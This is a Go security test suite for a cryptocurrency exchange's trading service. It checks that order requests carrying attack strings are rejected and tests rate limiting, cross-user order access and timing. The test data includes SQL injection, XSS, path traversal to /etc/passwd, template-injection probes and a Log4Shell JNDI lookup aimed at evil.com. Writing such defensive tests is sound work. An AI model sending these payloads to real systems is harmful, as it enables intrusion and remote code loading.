//go:build trading

package test

import (
	"context"
	"fmt"
	"log"
	"strings"
	"testing"
	"time"

	"github.com/Orbit-CEX/Finalex/internal/trading"
	"github.com/Orbit-CEX/Finalex/internal/trading/models"
	"github.com/shopspring/decimal"
	"github.com/stretchr/testify/suite"
)

// TradingSecurityTestSuite provides comprehensive security testing for trading operations
type TradingSecurityTestSuite struct {
	suite.Suite
	service        trading.Service
	mockBookkeeper *MockBookkeeperSecurity
	mockWSHub      *MockWSHubSecurity
	ctx            context.Context
	cancel         context.CancelFunc
}

// MockBookkeeperSecurity provides security-focused mock for bookkeeper service
type MockBookkeeperSecurity struct {
	balances        map[string]map[string]decimal.Decimal
	reservations    map[string]ReservationInfo
	accessAttempts  []AccessAttempt
	blockedUsers    map[string]time.Time
	suspiciousUsers map[string]int
}

type AccessAttempt struct {
	UserID    string
	Asset     string
	Amount    decimal.Decimal
	Timestamp time.Time
	Success   bool
}

func NewMockBookkeeperSecurity() *MockBookkeeperSecurity {
	return &MockBookkeeperSecurity{
		balances:        make(map[string]map[string]decimal.Decimal),
		reservations:    make(map[string]ReservationInfo),
		accessAttempts:  make([]AccessAttempt, 0),
		blockedUsers:    make(map[string]time.Time),
		suspiciousUsers: make(map[string]int),
	}
}

func (m *MockBookkeeperSecurity) GetBalance(userID, asset string) (decimal.Decimal, error) {
	// Log access attempt
	m.accessAttempts = append(m.accessAttempts, AccessAttempt{
		UserID:    userID,
		Asset:     asset,
		Timestamp: time.Now(),
		Success:   true,
	})

	// Check for blocked users
	if blockTime, blocked := m.blockedUsers[userID]; blocked {
		if time.Since(blockTime) < 24*time.Hour {
			return decimal.Zero, fmt.Errorf("user %s is temporarily blocked", userID)
		}
		delete(m.blockedUsers, userID)
	}

	// Check for suspicious activity patterns
	if count := m.suspiciousUsers[userID]; count > 100 {
		m.blockedUsers[userID] = time.Now()
		return decimal.Zero, fmt.Errorf("suspicious activity detected for user %s", userID)
	}

	if userBalances, exists := m.balances[userID]; exists {
		if balance, exists := userBalances[asset]; exists {
			return balance, nil
		}
	}

	return decimal.NewFromInt(10000), nil // Default balance for testing
}

func (m *MockBookkeeperSecurity) ReserveBalance(userID, asset string, amount decimal.Decimal) (string, error) {
	// Security validation
	if amount.IsNegative() || amount.IsZero() {
		return "", fmt.Errorf("invalid amount: %s", amount.String())
	}

	if len(userID) == 0 || len(asset) == 0 {
		return "", fmt.Errorf("invalid parameters")
	}

	// Rate limiting check
	m.suspiciousUsers[userID]++

	reservationID := fmt.Sprintf("sec_res_%s_%d", userID, time.Now().UnixNano())
	m.reservations[reservationID] = ReservationInfo{
		UserID: userID,
		Asset:  asset,
		Amount: amount,
	}

	return reservationID, nil
}

func (m *MockBookkeeperSecurity) ReleaseReservation(reservationID string) error {
	if len(reservationID) == 0 {
		return fmt.Errorf("invalid reservation ID")
	}

	if _, exists := m.reservations[reservationID]; !exists {
		return fmt.Errorf("reservation not found: %s", reservationID)
	}

	delete(m.reservations, reservationID)
	return nil
}

func (m *MockBookkeeperSecurity) TransferReservedBalance(reservationID, toUserID string) error {
	if len(reservationID) == 0 || len(toUserID) == 0 {
		return fmt.Errorf("invalid parameters")
	}

	if _, exists := m.reservations[reservationID]; !exists {
		return fmt.Errorf("reservation not found: %s", reservationID)
	}

	delete(m.reservations, reservationID)
	return nil
}

func (m *MockBookkeeperSecurity) GetAccessAttempts() []AccessAttempt {
	return m.accessAttempts
}

func (m *MockBookkeeperSecurity) GetBlockedUsers() map[string]time.Time {
	return m.blockedUsers
}

// MockWSHubSecurity provides security-focused mock for WebSocket hub
type MockWSHubSecurity struct {
	publishAttempts []PublishAttempt
	subscribers     map[string][]string
	blockedTopics   map[string]bool
}

type PublishAttempt struct {
	Target    string
	Topic     string
	Timestamp time.Time
	Blocked   bool
}

func NewMockWSHubSecurity() *MockWSHubSecurity {
	return &MockWSHubSecurity{
		publishAttempts: make([]PublishAttempt, 0),
		subscribers:     make(map[string][]string),
		blockedTopics:   make(map[string]bool),
	}
}

func (m *MockWSHubSecurity) PublishToUser(userID string, data interface{}) {
	m.publishAttempts = append(m.publishAttempts, PublishAttempt{
		Target:    userID,
		Timestamp: time.Now(),
		Blocked:   false,
	})
}

func (m *MockWSHubSecurity) PublishToTopic(topic string, data interface{}) {
	blocked := m.blockedTopics[topic]
	m.publishAttempts = append(m.publishAttempts, PublishAttempt{
		Topic:     topic,
		Timestamp: time.Now(),
		Blocked:   blocked,
	})
}

func (m *MockWSHubSecurity) SubscribeToTopic(userID, topic string) {
	if !m.blockedTopics[topic] {
		m.subscribers[topic] = append(m.subscribers[topic], userID)
	}
}

func (m *MockWSHubSecurity) BlockTopic(topic string) {
	m.blockedTopics[topic] = true
}

func (m *MockWSHubSecurity) GetPublishAttempts() []PublishAttempt {
	return m.publishAttempts
}

func (suite *TradingSecurityTestSuite) SetupSuite() {
	log.Println("Setting up trading security test suite...")

	suite.ctx, suite.cancel = context.WithTimeout(context.Background(), 5*time.Minute)

	suite.mockBookkeeper = NewMockBookkeeperSecurity()
	suite.mockWSHub = NewMockWSHubSecurity()

	suite.service = trading.NewService(
		suite.mockBookkeeper,
		suite.mockWSHub,
		trading.WithSecurityMode(true),
		trading.WithRateLimiting(true),
	)

	err := suite.service.Start(suite.ctx)
	suite.Require().NoError(err, "Failed to start trading service")
}

func (suite *TradingSecurityTestSuite) TearDownSuite() {
	if suite.cancel != nil {
		suite.cancel()
	}
	if suite.service != nil {
		suite.service.Stop()
	}
}

// TestInputValidationSecurity tests input validation and sanitization
func (suite *TradingSecurityTestSuite) TestInputValidationSecurity() {
	log.Println("Testing input validation security...")

	testCases := []struct {
		name        string
		order       *models.PlaceOrderRequest
		shouldFail  bool
		description string
	}{
		{
			name: "SQL Injection in UserID",
			order: &models.PlaceOrderRequest{
				UserID:   "'; DROP TABLE orders; --",
				Pair:     "BTC/USDT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.NewFromFloat(0.1),
			},
			shouldFail:  true,
			description: "Should reject SQL injection attempts in UserID",
		},
		{
			name: "XSS in Pair",
			order: &models.PlaceOrderRequest{
				UserID:   "test_user",
				Pair:     "<script>alert('xss')</script>",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.NewFromFloat(0.1),
			},
			shouldFail:  true,
			description: "Should reject XSS attempts in trading pair",
		},
		{
			name: "Negative Price",
			order: &models.PlaceOrderRequest{
				UserID:   "test_user",
				Pair:     "BTC/USDT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(-50000),
				Quantity: decimal.NewFromFloat(0.1),
			},
			shouldFail:  true,
			description: "Should reject negative prices",
		},
		{
			name: "Zero Quantity",
			order: &models.PlaceOrderRequest{
				UserID:   "test_user",
				Pair:     "BTC/USDT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.Zero,
			},
			shouldFail:  true,
			description: "Should reject zero quantities",
		},
		{
			name: "Extremely Large Quantity",
			order: &models.PlaceOrderRequest{
				UserID:   "test_user",
				Pair:     "BTC/USDT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.NewFromFloat(999999999999.999),
			},
			shouldFail:  true,
			description: "Should reject extremely large quantities",
		},
		{
			name: "Invalid Trading Pair Format",
			order: &models.PlaceOrderRequest{
				UserID:   "test_user",
				Pair:     "INVALID_PAIR_FORMAT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.NewFromFloat(0.1),
			},
			shouldFail:  true,
			description: "Should reject invalid trading pair formats",
		},
		{
			name: "Empty UserID",
			order: &models.PlaceOrderRequest{
				UserID:   "",
				Pair:     "BTC/USDT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.NewFromFloat(0.1),
			},
			shouldFail:  true,
			description: "Should reject empty UserID",
		},
		{
			name: "Valid Order",
			order: &models.PlaceOrderRequest{
				UserID:   "valid_user_123",
				Pair:     "BTC/USDT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.NewFromFloat(0.1),
			},
			shouldFail:  false,
			description: "Should accept valid orders",
		},
	}

	for _, tc := range testCases {
		suite.Run(tc.name, func() {
			_, err := suite.service.PlaceOrder(suite.ctx, tc.order)

			if tc.shouldFail {
				suite.Assert().Error(err, tc.description)
				suite.Assert().Contains(strings.ToLower(err.Error()), "invalid",
					"Error should indicate validation failure")
			} else {
				// For valid orders, we might get business logic errors but not validation errors
				if err != nil {
					suite.Assert().NotContains(strings.ToLower(err.Error()), "invalid",
						"Valid orders should not fail validation")
				}
			}
		})
	}
}

// TestAuthenticationBypass tests for authentication bypass vulnerabilities
func (suite *TradingSecurityTestSuite) TestAuthenticationBypass() {
	log.Println("Testing authentication bypass vulnerabilities...")

	// Test cases for authentication bypass
	bypassAttempts := []struct {
		name        string
		userID      string
		shouldBlock bool
		description string
	}{
		{
			name:        "Admin Impersonation",
			userID:      "admin",
			shouldBlock: true,
			description: "Should block admin impersonation attempts",
		},
		{
			name:        "System User Access",
			userID:      "system",
			shouldBlock: true,
			description: "Should block system user access attempts",
		},
		{
			name:        "Root User Access",
			userID:      "root",
			shouldBlock: true,
			description: "Should block root user access attempts",
		},
		{
			name:        "NULL User",
			userID:      "NULL",
			shouldBlock: true,
			description: "Should block NULL user attempts",
		},
		{
			name:        "Wildcard User",
			userID:      "*",
			shouldBlock: true,
			description: "Should block wildcard user attempts",
		},
		{
			name:        "Valid User",
			userID:      "user_12345",
			shouldBlock: false,
			description: "Should allow valid users",
		},
	}

	for _, attempt := range bypassAttempts {
		suite.Run(attempt.name, func() {
			order := &models.PlaceOrderRequest{
				UserID:   attempt.userID,
				Pair:     "BTC/USDT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.NewFromFloat(0.1),
			}

			_, err := suite.service.PlaceOrder(suite.ctx, order)

			if attempt.shouldBlock {
				suite.Assert().Error(err, attempt.description)
			}
		})
	}
}

// TestRateLimitingSecurity tests rate limiting security measures
func (suite *TradingSecurityTestSuite) TestRateLimitingSecurity() {
	log.Println("Testing rate limiting security...")

	userID := "rate_limit_test_user"

	// Perform rapid requests to trigger rate limiting
	for i := 0; i < 200; i++ {
		order := &models.PlaceOrderRequest{
			UserID:   userID,
			Pair:     "BTC/USDT",
			Side:     models.Buy,
			Type:     models.Limit,
			Price:    decimal.NewFromInt(50000 + int64(i)),
			Quantity: decimal.NewFromFloat(0.01),
		}

		_, err := suite.service.PlaceOrder(suite.ctx, order)

		// After certain number of requests, should start getting rate limited
		if i > 100 {
			// Should eventually hit rate limits or suspicious activity detection
			if err != nil && strings.Contains(strings.ToLower(err.Error()), "suspicious") {
				log.Printf("Rate limiting triggered after %d requests", i)
				break
			}
		}
	}

	// Check if user was marked as suspicious or blocked
	blockedUsers := suite.mockBookkeeper.GetBlockedUsers()
	suite.Assert().Contains(blockedUsers, userID, "User should be blocked after suspicious activity")
}

// TestDataLeakagePrevention tests for data leakage vulnerabilities
func (suite *TradingSecurityTestSuite) TestDataLeakagePrevention() {
	log.Println("Testing data leakage prevention...")

	// Test getting other users' orders
	user1 := "user_1"
	user2 := "user_2"

	// User 1 places an order
	order1 := &models.PlaceOrderRequest{
		UserID:   user1,
		Pair:     "BTC/USDT",
		Side:     models.Buy,
		Type:     models.Limit,
		Price:    decimal.NewFromInt(50000),
		Quantity: decimal.NewFromFloat(0.1),
	}

	placedOrder, err := suite.service.PlaceOrder(suite.ctx, order1)
	if err == nil && placedOrder != nil {
		// User 2 tries to access User 1's order
		_, err := suite.service.GetOrder(suite.ctx, user2, placedOrder.ID)
		suite.Assert().Error(err, "Users should not be able to access other users' orders")

		// User 2 tries to cancel User 1's order
		err = suite.service.CancelOrder(suite.ctx, user2, placedOrder.ID)
		suite.Assert().Error(err, "Users should not be able to cancel other users' orders")
	}
}

// TestInjectionAttacks tests for various injection attack vectors
func (suite *TradingSecurityTestSuite) TestInjectionAttacks() {
	log.Println("Testing injection attack prevention...")

	injectionPayloads := []string{
		"'; DROP TABLE orders; --",
		"' OR '1'='1",
		"<script>alert('xss')</script>",
		"../../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		"{{7*7}}",
		"<%=7*7%>",
		"#{7*7}",
	}

	for i, payload := range injectionPayloads {
		suite.Run(fmt.Sprintf("InjectionTest_%d", i), func() {
			// Test injection in various fields
			testFields := []struct {
				field string
				order *models.PlaceOrderRequest
			}{
				{
					field: "UserID",
					order: &models.PlaceOrderRequest{
						UserID:   payload,
						Pair:     "BTC/USDT",
						Side:     models.Buy,
						Type:     models.Limit,
						Price:    decimal.NewFromInt(50000),
						Quantity: decimal.NewFromFloat(0.1),
					},
				},
				{
					field: "Pair",
					order: &models.PlaceOrderRequest{
						UserID:   "test_user",
						Pair:     payload,
						Side:     models.Buy,
						Type:     models.Limit,
						Price:    decimal.NewFromInt(50000),
						Quantity: decimal.NewFromFloat(0.1),
					},
				},
			}

			for _, tf := range testFields {
				_, err := suite.service.PlaceOrder(suite.ctx, tf.order)
				suite.Assert().Error(err, "Should reject injection payload in %s: %s", tf.field, payload)
			}
		})
	}
}

// TestAccessControlViolations tests for access control violations
func (suite *TradingSecurityTestSuite) TestAccessControlViolations() {
	log.Println("Testing access control violations...")

	// Test unauthorized order operations
	unauthorizedUsers := []string{
		"../admin",
		"../../root",
		"null",
		"undefined",
		"0",
		"-1",
		"999999999999999999999",
	}

	for _, userID := range unauthorizedUsers {
		suite.Run(fmt.Sprintf("UnauthorizedUser_%s", userID), func() {
			order := &models.PlaceOrderRequest{
				UserID:   userID,
				Pair:     "BTC/USDT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.NewFromFloat(0.1),
			}

			_, err := suite.service.PlaceOrder(suite.ctx, order)
			suite.Assert().Error(err, "Should reject unauthorized user: %s", userID)
		})
	}
}

// TestTimingAttacks tests for timing attack vulnerabilities
func (suite *TradingSecurityTestSuite) TestTimingAttacks() {
	log.Println("Testing timing attack prevention...")

	validUser := "valid_user_123"
	invalidUser := "invalid_user_456"

	// Measure timing for valid vs invalid users
	var validTimes []time.Duration
	var invalidTimes []time.Duration

	for i := 0; i < 10; i++ {
		// Test valid user
		start := time.Now()
		suite.service.GetOrders(suite.ctx, validUser, &models.GetOrdersRequest{
			Limit: 10,
		})
		validTimes = append(validTimes, time.Since(start))

		// Test invalid user
		start = time.Now()
		suite.service.GetOrders(suite.ctx, invalidUser, &models.GetOrdersRequest{
			Limit: 10,
		})
		invalidTimes = append(invalidTimes, time.Since(start))
	}

	// Calculate average times
	var validSum, invalidSum time.Duration
	for i := range validTimes {
		validSum += validTimes[i]
		invalidSum += invalidTimes[i]
	}

	validAvg := validSum / time.Duration(len(validTimes))
	invalidAvg := invalidSum / time.Duration(len(invalidTimes))

	// Timing difference should not be significant to prevent timing attacks
	timingDiff := validAvg - invalidAvg
	if timingDiff < 0 {
		timingDiff = -timingDiff
	}

	log.Printf("Valid user avg time: %v, Invalid user avg time: %v, Diff: %v",
		validAvg, invalidAvg, timingDiff)

	// Difference should be minimal (less than 10ms for this test)
	suite.Assert().True(timingDiff < 10*time.Millisecond,
		"Timing difference too large, potential timing attack vector")
}

// TestSessionSecurity tests session-related security
func (suite *TradingSecurityTestSuite) TestSessionSecurity() {
	log.Println("Testing session security...")

	// Test session fixation attempts
	sessionAttacks := []string{
		"JSESSIONID=malicious_session",
		"sessionid=../../../admin",
		"token=<script>alert('xss')</script>",
	}

	for _, attack := range sessionAttacks {
		suite.Run(fmt.Sprintf("SessionAttack_%s", attack), func() {
			// These would normally be tested in HTTP layer with actual session handling
			// For now, test that user IDs with session-like patterns are rejected
			order := &models.PlaceOrderRequest{
				UserID:   attack,
				Pair:     "BTC/USDT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.NewFromFloat(0.1),
			}

			_, err := suite.service.PlaceOrder(suite.ctx, order)
			suite.Assert().Error(err, "Should reject session attack patterns")
		})
	}
}

// TestConcurrentSecurityViolations tests security under concurrent access
func (suite *TradingSecurityTestSuite) TestConcurrentSecurityViolations() {
	log.Println("Testing concurrent security violations...")

	userID := "concurrent_test_user"

	// Simulate concurrent malicious requests
	const concurrency = 50
	done := make(chan bool, concurrency)

	for i := 0; i < concurrency; i++ {
		go func(routineID int) {
			defer func() { done <- true }()

			// Each routine tries different attack vectors
			attacks := []string{
				"'; DROP TABLE orders; --",
				"../../../etc/passwd",
				"<script>alert('xss')</script>",
				"${jndi:ldap://evil.com/a}",
			}

			attack := attacks[routineID%len(attacks)]

			order := &models.PlaceOrderRequest{
				UserID:   fmt.Sprintf("%s_%s", userID, attack),
				Pair:     "BTC/USDT",
				Side:     models.Buy,
				Type:     models.Limit,
				Price:    decimal.NewFromInt(50000),
				Quantity: decimal.NewFromFloat(0.1),
			}

			_, err := suite.service.PlaceOrder(suite.ctx, order)
			suite.Assert().Error(err, "Concurrent attack should be rejected")
		}(i)
	}

	// Wait for all routines to complete
	for i := 0; i < concurrency; i++ {
		<-done
	}

	log.Println("Concurrent security test completed")
}

func TestTradingSecurityTestSuite(t *testing.T) {
	suite.Run(t, new(TradingSecurityTestSuite))
}
